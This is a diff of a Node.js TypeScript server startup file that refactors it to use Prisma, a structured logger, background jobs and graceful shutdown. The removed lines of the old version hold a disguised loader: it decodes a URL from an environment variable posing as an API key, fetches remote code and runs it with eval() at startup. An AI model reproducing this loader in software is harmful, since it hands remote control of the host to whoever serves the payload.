@@ -1,44 +1,65 @@
-import { Server } from "http";
-import app from "./app";
-import config from "./config";
+import { app } from './app';
+import { env } from './config';
+import { prisma } from './lib/prisma';
+import { logger } from './utils/logger';
+import { startBackgroundJobs, stopBackgroundJobs } from './jobs';
 
-let server: Server;
-
-async function main() {
+const startServer = async () => {
   try {
-    // 1. Connect to database
-    // 2. Initialize data in DB ( if there any , ex: admin or super admin)
-    // 3. Start HTTP server
-    server = app.listen(config.port, () => {
-      console.log(`Server is running on port ${config.port}`);
+    // Verify database connection on startup
+    logger.info('Connecting to MongoDB via Prisma...');
+    await prisma.$connect();
+    logger.info('✅ Successfully connected to MongoDB.');
+
+    // Initialize and start background cron jobs
+    startBackgroundJobs();
+
+    const server = app.listen(env.PORT, () => {
+      logger.info(
+        `🚀 Server running in ${env.NODE_ENV} mode on port ${env.PORT} (PID: ${process.pid})`
+      );
+      logger.info(`🔗 Health check: http://localhost:${env.PORT}/api/v1/health`);
+      logger.info(`📖 API Docs: http://localhost:${env.PORT}/api-docs`);
     });
 
-    // Handle server errors
-    server.on("error", (error: any) => {
-      if (error.code === "EADDRINUSE") {
-        console.error(`❌ Port 8000 is already in use`);
-      } else {
-        console.error("❌ Server error:", error);
-      }
+    const gracefulShutdown = async (signal: string) => {
+      logger.info(`Received ${signal}. Starting graceful shutdown...`);
+      stopBackgroundJobs();
+      server.close(async () => {
+        logger.info('HTTP server closed.');
+        try {
+          await prisma.$disconnect();
+          logger.info('Prisma disconnected.');
+          process.exit(0);
+        } catch (err) {
+          logger.error({ err }, 'Error during Prisma disconnection');
+          process.exit(1);
+        }
+      });
+
+      // Force shutdown after 10s if hanging
+      setTimeout(() => {
+        logger.error('Could not close connections in time, forcefully shutting down');
+        process.exit(1);
+      }, 10000);
+    };
+
+    process.on('SIGINT', () => gracefulShutdown('SIGINT'));
+    process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
+
+    process.on('unhandledRejection', (reason) => {
+      logger.error({ err: reason }, 'Unhandled Promise Rejection');
+    });
+
+    process.on('uncaughtException', (err) => {
+      logger.fatal({ err }, 'Uncaught Exception! Server shutting down...');
       process.exit(1);
     });
   } catch (error) {
-    console.error("Failed to start server", error);
+    logger.fatal({ err: error }, 'Failed to start server');
+    await prisma.$disconnect().catch(() => {});
     process.exit(1);
   }
-}
+};
 
-main();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+startServer();
